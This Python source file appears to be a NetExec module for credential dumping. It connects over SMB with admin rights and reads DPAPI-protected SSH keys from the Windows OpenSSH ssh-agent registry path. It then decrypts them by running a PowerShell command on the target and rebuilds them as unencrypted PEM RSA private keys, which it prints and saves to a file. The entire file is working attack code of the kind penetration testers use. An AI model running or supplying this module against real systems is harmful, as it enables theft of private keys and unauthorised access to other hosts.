#!/usr/bin/env python3
r"""
Module to extract unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries.

When adding private keys to ssh-agent, Windows protects the private keys with DPAPI and stores 
them as registry entries under HKCU:\Software\OpenSSH\Agent\Keys

With elevated privileges, it is possible to pull out the binary blobs from the registry and 
unprotect them using DPAPI. These blobs can then be restructured into the original, unencrypted 
private RSA keys.

Original Python implementation credit: soleblaze
https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py
"""

import base64
from base64 import b64encode
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
from nxc.helpers.misc import CATEGORY

try:
    from pyasn1.type import univ
    from pyasn1.codec.der import encoder
    HAS_PYASN1 = True
except ImportError:
    HAS_PYASN1 = False


class NXCModule:
    """
    Extracts unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries.
    Module by @mverschu (adapted for NetExec)
    """

    name = "ssh_keys"
    description = "Extract unencrypted private SSH keys from Windows OpenSSH ssh-agent registry entries (HKCU:\\Software\\OpenSSH\\Agent\\Keys)"
    supported_protocols = ["smb"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options

    def options(self, context, module_options):
        """OUTPUTFILE       Output file to write extracted SSH private keys"""
        self.outputfile = None
        if "OUTPUTFILE" in module_options:
            self.outputfile = module_options["OUTPUTFILE"]

    def on_admin_login(self, context, connection):
        if not HAS_PYASN1:
            context.log.fail("pyasn1 package is required. Install it with: pip install pyasn1")
            return

        context.log.display("Extracting SSH keys from registry...")
        
        remote_ops = RemoteOperations(connection.conn, False)
        remote_ops.enableRegistry()

        try:
            # Open HKCU
            ans = rrp.hOpenCurrentUser(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            
            # Open the OpenSSH Agent Keys path
            try:
                ans = rrp.hBaseRegOpenKey(
                    remote_ops._RemoteOperations__rrp,
                    reg_handle,
                    "Software\\OpenSSH\\Agent\\Keys"
                )
                key_handle = ans["phkResult"]
            except Exception as e:
                context.log.fail(f"Could not open registry path HKCU:\\Software\\OpenSSH\\Agent\\Keys: {e}")
                context.log.info("This may indicate that OpenSSH ssh-agent is not being used or no keys are stored.")
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, reg_handle)
                return

            # Enumerate all subkeys (each represents a stored SSH key)
            key_names = []
            i = 0
            while True:
                try:
                    ans = rrp.hBaseRegEnumKey(remote_ops._RemoteOperations__rrp, key_handle, i)
                    key_name = ans["lpNameOut"].rstrip("\x00")
                    if key_name:
                        key_names.append(key_name)
                    i += 1
                except DCERPCException:
                    break

            if not key_names:
                context.log.info("No SSH keys found in registry")
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
                rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, reg_handle)
                return

            context.log.success(f"Found {len(key_names)} SSH key(s) in registry")

            # Extract keys
            extracted_keys = []
            for key_name in key_names:
                try:
                    # Open the subkey for this SSH key
                    ans = rrp.hBaseRegOpenKey(
                        remote_ops._RemoteOperations__rrp,
                        key_handle,
                        key_name
                    )
                    subkey_handle = ans["phkResult"]

                    # Read the encrypted data (default value) and comment
                    try:
                        # Get the default value (encrypted key data)
                        data_type, enc_data = rrp.hBaseRegQueryValue(
                            remote_ops._RemoteOperations__rrp,
                            subkey_handle,
                            ""
                        )
                        context.log.debug(f"Read registry data type: {data_type}, data length: {len(enc_data) if enc_data else 0}")
                        
                        # Get the comment value
                        try:
                            comment_type, comment_data = rrp.hBaseRegQueryValue(
                                remote_ops._RemoteOperations__rrp,
                                subkey_handle,
                                "comment"
                            )
                            if isinstance(comment_data, bytes):
                                comment = comment_data.decode('utf-8', errors='ignore').rstrip('\x00')
                            else:
                                comment = str(comment_data).rstrip('\x00')
                        except Exception as e:
                            context.log.debug(f"Could not read comment: {e}")
                            comment = key_name

                        # Convert encrypted data to base64 for PowerShell processing
                        if isinstance(enc_data, bytes):
                            enc_data_b64 = base64.b64encode(enc_data).decode('utf-8')
                        elif isinstance(enc_data, list):
                            # Registry binary data is often returned as a list of bytes
                            enc_data = b''.join(enc_data) if enc_data else b''
                            enc_data_b64 = base64.b64encode(enc_data).decode('utf-8')
                        else:
                            # Try to convert to bytes
                            try:
                                enc_data = bytes(enc_data)
                                enc_data_b64 = base64.b64encode(enc_data).decode('utf-8')
                            except Exception as e:
                                context.log.debug(f"Error converting registry data to bytes: {e}")
                                raise
                        
                        context.log.debug(f"Encrypted data base64 length: {len(enc_data_b64)}")

                        # Decrypt using DPAPI via PowerShell
                        context.log.debug(f"Decrypting key: {comment}")
                        decrypted_b64 = self._decrypt_dpapi(context, connection, enc_data_b64)
                        
                        if decrypted_b64:
                            extracted_keys.append({
                                "comment": comment,
                                "data": decrypted_b64
                            })
                            context.log.success(f"Successfully extracted key: {comment}")
                        else:
                            context.log.fail(f"Failed to decrypt key: {comment}")

                    except Exception as e:
                        context.log.debug(f"Error reading key {key_name}: {e}")
                    finally:
                        rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, subkey_handle)

                except Exception as e:
                    context.log.debug(f"Error processing key {key_name}: {e}")

            # Reconstruct and display RSA private keys
            if extracted_keys:
                # Center the header
                header_text = "Extracted SSH Private Keys:"
                separator = "=" * 80
                header_centered = header_text.center(80)
                
                context.log.display("\n" + separator)
                context.log.display(header_centered)
                context.log.display(separator + "\n")
                
                # Prepare keys for display and file output
                keys_to_save = []
                
                for key_data in extracted_keys:
                    private_key = self._extract_rsa_key(key_data["data"])
                    if private_key:
                        context.log.highlight(f"[+] Key Comment: {key_data['comment']}")
                        context.log.highlight(private_key)
                        context.log.display("")
                        
                        # Store for file output
                        keys_to_save.append({
                            "comment": key_data['comment'],
                            "key": private_key
                        })
                    else:
                        context.log.fail(f"Could not reconstruct RSA key for: {key_data['comment']}")
                
                # Save to file if outputfile is specified
                if self.outputfile:
                    try:
                        with open(self.outputfile, "w") as fd:
                            for key_info in keys_to_save:
                                fd.write(f"# Key Comment: {key_info['comment']}\n")
                                fd.write(key_info['key'])
                                fd.write("\n\n")
                        context.log.success(f"Saved {len(keys_to_save)} SSH key(s) to {self.outputfile}")
                    except Exception as e:
                        context.log.fail(f"Failed to write keys to file {self.outputfile}: {e}")
            else:
                context.log.info("No keys were successfully extracted")

            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, key_handle)
            rrp.hBaseRegCloseKey(remote_ops._RemoteOperations__rrp, reg_handle)

        except Exception as e:
            context.log.fail(f"Error extracting SSH keys: {e}")
            import traceback
            context.log.debug(traceback.format_exc())
        finally:
            remote_ops.finish()

    def _decrypt_dpapi(self, context, connection, enc_data_b64):
        """
        Decrypt DPAPI-protected data using PowerShell on the remote system.
        Uses CurrentUser scope as required for HKCU registry data.
        """
        # PowerShell command to decrypt using DPAPI
        # Using single quotes to avoid issues with special characters in base64
        ps_command = f"""
$ProgressPreference = 'SilentlyContinue';
Add-Type -AssemblyName System.Security;
try {{
    $encdata = [System.Convert]::FromBase64String('{enc_data_b64}');
    $decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser');
    $b64key = [System.Convert]::ToBase64String($decdata);
    Write-Output $b64key;
}} catch {{
    Write-Output "ERROR: $($_.Exception.Message)";
    Write-Output "ERROR_TYPE: $($_.Exception.GetType().FullName)";
}}
"""
        try:
            # Try ps_execute first
            output = connection.ps_execute(ps_command, get_output=True)
            context.log.debug(f"Raw ps_execute output type: {type(output)}, value: {str(output)[:200] if output else 'None'}")
            
            # Handle tuple output (stdout, stderr)
            if isinstance(output, tuple):
                stdout, stderr = output
                context.log.debug(f"stdout: {str(stdout)[:200] if stdout else 'None'}, stderr: {str(stderr)[:200] if stderr else 'None'}")
                output = stdout if stdout else stderr
            
            # Convert to string if needed
            if output and not isinstance(output, str):
                if isinstance(output, bytes):
                    output = output.decode('utf-8', errors='ignore')
                else:
                    output = str(output)
            
            # If ps_execute didn't work, try execute() with base64-encoded script
            if not output or output.strip() == "":
                context.log.debug("ps_execute returned empty output, trying execute() with base64-encoded script")
                ps_script_b64 = b64encode(ps_command.encode("UTF-16LE")).decode("utf-8")
                output = connection.execute(f"powershell.exe -e {ps_script_b64} -OutputFormat Text", True)
                context.log.debug(f"execute() output type: {type(output)}, length: {len(output) if output else 0}")
            
            if not output:
                context.log.debug("Empty output from PowerShell decryption")
                return None
            
            # Handle string output from execute()
            if isinstance(output, bytes):
                output = output.decode('utf-8', errors='ignore')
            elif not isinstance(output, str):
                output = str(output)
            
            output = output.strip()
            
            # Handle CLIXML format (PowerShell serialization)
            if "CLIXML" in output:
                parts = output.split("CLIXML")
                if len(parts) > 1:
                    output = parts[1].split("<Objs Version")[0].strip()
            
            # Check for error messages
            if output.startswith("ERROR:"):
                error_msg = output
                context.log.debug(f"DPAPI decryption error: {error_msg}")
                return None
            
            # Validate it's base64
            try:
                decoded = base64.b64decode(output)
                if len(decoded) == 0:
                    context.log.debug("Decoded base64 is empty")
                    return None
                context.log.debug(f"Successfully decrypted {len(decoded)} bytes")
            except Exception as e:
                context.log.debug(f"Output is not valid base64: {e}")
                context.log.debug(f"Output preview (first 200 chars): {output[:200]}")
                return None
            
            return output
        except Exception as e:
            context.log.debug(f"Error executing PowerShell decryption: {e}")
            import traceback
            context.log.debug(traceback.format_exc())
            return None

    def _extract_rsa_key(self, data):
        """
        Extract RSA private key from base64 decoded data.
        Based on the implementation by soleblaze from sshkey-grab.
        """
        try:
            keybytes = base64.b64decode(data)
            offset = keybytes.find(b"ssh-rsa")
            if offset == -1:
                return None
            
            keybytes = keybytes[offset:]

            # Extract RSA key components
            start = 10
            size = self._get_int(keybytes[start:(start+2)])
            start += 2
            n = self._get_int(keybytes[start:(start+size)])
            start = start + size + 2
            size = self._get_int(keybytes[start:(start+2)])
            start += 2
            e = self._get_int(keybytes[start:(start+size)])
            start = start + size + 2
            size = self._get_int(keybytes[start:(start+2)])
            start += 2
            d = self._get_int(keybytes[start:(start+size)])
            start = start + size + 2
            size = self._get_int(keybytes[start:(start+2)])
            start += 2
            c = self._get_int(keybytes[start:(start+size)])
            start = start + size + 2
            size = self._get_int(keybytes[start:(start+2)])
            start += 2
            p = self._get_int(keybytes[start:(start+size)])
            start = start + size + 2
            size = self._get_int(keybytes[start:(start+2)])
            start += 2
            q = self._get_int(keybytes[start:(start+size)])

            e1 = d % (p - 1)
            e2 = d % (q - 1)

            # Construct ASN.1 structure
            seq = (
                univ.Integer(0),
                univ.Integer(n),
                univ.Integer(e),
                univ.Integer(d),
                univ.Integer(p),
                univ.Integer(q),
                univ.Integer(e1),
                univ.Integer(e2),
                univ.Integer(c),
            )

            struct = univ.Sequence()
            for i in range(len(seq)):
                struct.setComponentByPosition(i, seq[i])
            
            raw = encoder.encode(struct)
            data_b64 = base64.b64encode(raw).decode('utf-8')

            # Format as PEM
            width = 64
            chopped = [data_b64[i:i + width] for i in range(0, len(data_b64), width)]
            top = "-----BEGIN RSA PRIVATE KEY-----\n"
            content = "\n".join(chopped)
            bottom = "\n-----END RSA PRIVATE KEY-----"
            return top + content + bottom

        except Exception as e:
            # Note: context not available here, but errors are handled by caller
            return None

    def _get_int(self, buf):
        """Convert bytes to big-endian integer."""
        return int.from_bytes(buf, byteorder='big')

